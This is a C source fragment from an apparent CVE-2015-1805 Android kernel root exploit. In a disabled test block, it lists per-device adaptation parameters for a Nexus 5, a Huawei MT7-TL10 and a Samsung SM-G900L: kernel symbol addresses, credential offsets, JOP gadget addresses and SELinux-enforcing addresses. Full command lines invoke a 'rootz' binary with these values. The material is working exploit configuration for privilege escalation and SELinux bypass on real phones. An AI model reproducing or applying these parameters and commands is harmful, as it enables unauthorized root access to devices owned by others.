/*
 * CVE-2015-1805 exploit adp args
 *
 * Copyright (C) 2017 by idhyt3r@gmail.com
 *
 */

#include "param.h"

/* 

  通用内核函数地址定义在 param.h 头文件中
  
  针对不同手机适配需要特殊定义的，在该头文件中定义

*/

// #define TEST_FOR_TEST

#ifdef TEST_FOR_TEST

#if 0

适配信息 

/* nexus 5 */
 Linux version 3.4.0-gbebb36b (android-build@vpbs1.mtv.corp.google.com) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Mar 10 18:17:45 UTC 2015

./data/local/tmp/rootz "n=1022&k=[101=0xc1237658;103=0x50;104=0xc1042f38;105=0x58;107=0xc085ed40;109=0x4;]&j=[0x18=0xaaaaaaaa;0x24=0xc0279bd0;0x0=0x0;]&p=[0xc122dae4=0x0=0x4;0xc12376a8=0x0=0x4;]"

101 ptmx_fops = 0xc1237658
103 ptmx_kfunc_offset = 0x50    check_flags
104 init_task = 0xc1042f38
105 task_security_offset = 0x58
107 kernel_sock_ioctl = 0xC085ED40
109 task_cred_uid_offset = 0x4

jop

0x24=0xc0279bd0 check_flags back

path
selinux_enforcing = 0xc122dae4
ptmx_fops + ptmx_kfunc_offset = 0xc12376a8


Linux version 3.4.0-g2aa165e (android-build@wped19.hot.corp.google.com) (gcc version 4.8 (GCC) ) #1 SMP PREEMPT Thu Aug 20 06:07:34 UTC 2015
n=1022&k=[101=0xc1338250;103=0x50;104=0xc1142f80;105=0x58;107=0xc088b1c4;109=0x4;]&j=[0x18=0xaaaaaaaa;0x24=0xc0281d04;0x0=0x0;]&p=[0xc132e6a8=0x0=0x4;0xc13382a0=0x0=0x4;]


/* MT7-TL10 */

[+] kernel version: Linux version 3.10.86-g76ac748 (android@localhost) (gcc version 4.7.3 20121205 (prerelease) (crosstool-NG linaro-1.13.1-4.7-2012.12-20121214 - Linaro GCC 2012.12) ) #2 SMP PREEMPT Mon Apr 4 05:03:33 CST 2016

./data/local/tmp/rootz "n=1022&k=[101=0xc15b0454;103=0x50;104=0xc139aae0;105=0x68;107=0xc0ddb6b0;109=0x10;801=0xc13b554c;802=0xc15a955c;]&j=[0x18=0xaaaaaaaa;0x24=0xc0701c78;0x0=0x0;]&p=[0xc15a7990=0x0=0x4;0xc15b04a4=0x0=0x4;]"

101 ptmx_fops = 0xc15b0454
103 ptmx_kfunc_offset = 0x50    check_flags
104 init_task = 0xc139aae0
105 task_security_offset = 0x68
107 kernel_sock_ioctl = 0xc0ddb6b0
109 task_cred_uid_offset = 0x10

jop
0x24=0xc0701c78 check_flags back

path
selinux_enforcing = 0xc15a7990
ptmx_fops + ptmx_kfunc_offset = 0xc15b04a4

mount bypass
801 adp_ro_secure_debuggable = 0xc13b554c;
802 adp_ro_secure_debuggable_static = 0xc15a955c;

SM-G900L
Linux version 3.4.0-6309255 (dpi@SWDD6912) (gcc version 4.8 (GCC) ) #1 SMP PREEMPT Fri Dec 4 15:28:30 KST 2015
n=1022&k=[101=0xc14444b8;103=0x50;104=0xc1120f20;105=0x58;107=0xc085167c;109=0x4;811=0x1;]&j=[0x18=0xaaaaaaaa;0x24=0xc02697c0;0x0=0x0;]&p=[0xc142da78=0x0=0x4;0xc1444508=0x0=0x4;]

#endif

#endif


